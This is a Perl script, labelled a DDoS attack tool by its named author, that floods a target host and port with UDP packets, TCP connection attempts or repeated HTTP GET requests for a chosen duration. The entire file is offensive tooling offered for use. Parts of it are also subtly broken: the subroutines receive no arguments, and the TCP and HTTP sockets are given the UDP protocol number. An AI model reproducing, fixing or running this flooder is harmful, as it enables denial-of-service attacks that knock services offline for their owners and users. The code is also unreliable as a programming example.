#!/usr/bin/perl -w

use strict;
use Getopt::Std;
use IO::Socket;

# DDOS Attack Script
# Author: [Zemarkhos]

my %opts;
my $host;
my $port;
my $size;
my $time;
my $method;

# Get command line options
getopts('h:p:t:m:s:', \%opts);

if ($opts{h}) {
	$host = $opts{h};
} else {
	&usage;
}

if ($opts{p}) {
	$port = $opts{p};
} else {
	&usage;
}

if ($opts{t}) {
	$time = $opts{t};
} else {
	&usage;
}

if ($opts{m}) {
	$method = $opts{m};
} else {
	&usage;
}

if ($opts{s}) {
	$size = $opts{s};
} else {
	&usage;
}

# Show usage if the user didn't specify the required command line options
sub usage {
	print "Usage: ZemDos.pl -h <host> -p <port> -t <time> -m <method> -s <size>\n";
	print "Methods:\n";
	print "  udp  - UDP Flood Attack\n";
	print "  tcp  - TCP Flood Attack\n";
	print "  http - HTTP Flood Attack\n";
	exit;
}

# Start the attack
if ($method eq "udp") {
	&udp_attack;
} elsif ($method eq "tcp") {
	&tcp_attack;
} elsif ($method eq "http") {
	&http_attack;
} else {
	&usage;
}

# UDP Attack
sub udp_attack {
	my ($ip, $port, $size, $time) = @_;
	my ($iaddr, $endtime, $psize, $pport);
	$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
	$endtime = time() + ($time ? $time : 1000000);
	socket(flood, PF_INET, SOCK_DGRAM, 17);
	print "~To cancel the attack press \'Ctrl-C\'\n\n";
	print "|IP|\t\t |Port|\t\t |Size|\t\t |Time|\n";
	print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
	print "To cancel the attack press 'Ctrl-C'\n" unless $time;
	for (;time() <= $endtime;) {
		$psize = $size ? $size : int(rand(1024-64)+64) ;
		$pport = $port ? $port : int(rand(65500))+1;
		send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
	}
}

# TCP Attack
sub tcp_attack {
	my ($ip, $port, $size, $time) = @_;
	my ($iaddr, $endtime, $psize, $pport);
	$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
	$endtime = time() + ($time ? $time : 1000000);
	socket(flood, PF_INET, SOCK_STREAM, 17);
	print "~To cancel the attack press \'Ctrl-C\'\n\n";
	print "|IP|\t\t |Port|\t\t |Size|\t\t |Time|\n";
	print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
	print "To cancel the attack press 'Ctrl-C'\n" unless $time;
	for (;time() <= $endtime;) {
		$psize = $size ? $size : int(rand(1024-64)+64) ;
		$pport = $port ? $port : int(rand(65500))+1;

		connect(flood, pack_sockaddr_in($pport, $iaddr));
	}
}

# HTTP Attack
sub http_attack {
	my ($ip, $port, $size, $time) = @_;
	my ($iaddr, $endtime, $psize, $pport);
	$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
	$endtime = time() + ($time ? $time : 100);
	socket(flood, PF_INET, SOCK_STREAM, 17);
	print "~To cancel the attack press \'Ctrl-C\'\n\n";
	print "|IP|\t\t |Port|\t\t |Size|\t\t |Time|\n";
	print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
	print "To cancel the attack press 'Ctrl-C'\n" unless $time;
	for (;time() <= $endtime;) {
		$psize = $size ? $size : int(rand(1024-64)+64) ;
		$pport = $port ? $port : int(rand(65500))+1;

		connect(flood, pack_sockaddr_in($pport, $iaddr));
		print flood "GET / HTTP/1.1\r\n";
		print flood "Host: $ip\r\n";
		print flood "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n";
		print flood "Content-Length: 42\r\n";
		print flood "Content-Type: application/x-www-form-urlencoded\r\n";
		print flood "Connection: Keep-Alive\r\n\r\n";
		sleep(1);
	}
}